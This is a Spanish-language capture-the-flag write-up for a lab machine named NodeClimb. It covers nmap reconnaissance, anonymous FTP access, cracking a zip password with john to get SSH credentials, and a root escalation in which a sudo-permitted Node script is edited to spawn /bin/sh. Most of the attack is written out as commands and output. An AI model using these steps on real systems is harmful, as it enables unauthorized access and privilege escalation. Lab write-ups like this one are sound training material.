# NodeClimb
## Reconocimiento Inicial con Nmap

```Bash
nmap -O -sC -sV 172.17.0.2
```
**Resultado** 

```Bash
PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 | ftp-syst:   |   STAT:   | FTP server status: |      Connected to ::ffff:172.17.0.1 |      Logged in as ftp |      TYPE: ASCII |      No session bandwidth limit |      Session timeout in seconds is 300 |      Control connection is plain text |      Data connections will be plain text |      At session startup, client count was 4 |      vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey:   |   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA) |_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519) MAC Address: 02:42:AC:11:00:02 (Unknown)
```


La salida de nmap revela dos puertos abiertos:

•Puerto 21 (FTP): Se ejecuta vsftpd 3.0.3. Lo más importante es que el escaneo indica ftp-anon: Anonymous FTP login allowed (FTP code 230), lo que significa que se permite el acceso anónimo al servidor FTP. Además, se lista un archivo secretitopicaron.zip en el directorio raíz del FTP anónimo. Esto sugiere que el ataque comenzará por aquí.

•Puerto 22 (SSH): Se ejecuta OpenSSH 9.2p1 Debian. Este servicio es un posible punto de entrada si se obtienen credenciales válidas.

## Acceso Anónimo FTP
```bash
ftp 172.17.0.2

anonymous
anonymous
```

```bash
tp> ls  
229 Entering Extended Passive Mode (|||59283|)  
150 Here comes the directory listing.  
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
```

```bash
get secretitopicaron.zip
exit
```
Desde nuestra máquina atacante, descomprimimos y vemos que contiene el documento

```bash
unzip secretitopicaron.zip    
Archive:  secretitopicaron.zip  
[secretitopicaron.zip] password.txt password:
```
Para descomprimir, se necesita una contraseña, por lo que vamos a romperlo con john
```bash
└─$ zip2john secretitopicaron.zip > zip_hash.txt  
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0


└─$ john zip_hash.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (PKZIP [32/64])  
Will run 4 OpenMP threads  
Proceeding with single, rules:Single  
Press 'q' or Ctrl-C to abort, almost any other key for status  
password1        (secretitopicaron.zip/password.txt)        
1g 0:00:00:00 DONE 1/3 (2025-08-02 21:11) 2.222g/s 1877p/s 1877c/s 1877C/s zpassword1..psecretitopicaron1  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

La contraseña es password1

```bash
cat password.txt    
mario:laKontraseñAmasmalotaHdelbarrioH
```

## Acceso FTP

```bash
ftp 172.17.0.2
mario
laKontraseñAmasmalotaHdelbarrioH
```

Vemos un scrip y lo descargamos
```bash
ls
# -rw-r--r--    1 1000     1000            0 Jul 05  2024 script.js
get script.js
```

Nos salimos y vemos que no contiene nada

## Acceso ssh 
```bash
ssh mario@172.17.0.2
# laKontraseñAmasmalotaHdelbarrioH
```

```bash
whoami
# mario
```
Empezamos siendo un usuario sin privilegios.

## Escalada de privilegios
Aparece el mismo script.js sin contenido

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```
Podemos ejecutar el scipt con node

Buscamos en GTFObins "node" en el apartado de Sudo:
```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Por lo que vamos a modificar el json para que nos de una consola de comandos con los permisos de root

```bash
nano script.js
# require('child_process').spawn('/bin/sh', {stdio: [0,1,2]});
sudo -u root /usr/bin/node /home/mario/script.js
whoami
# root
```
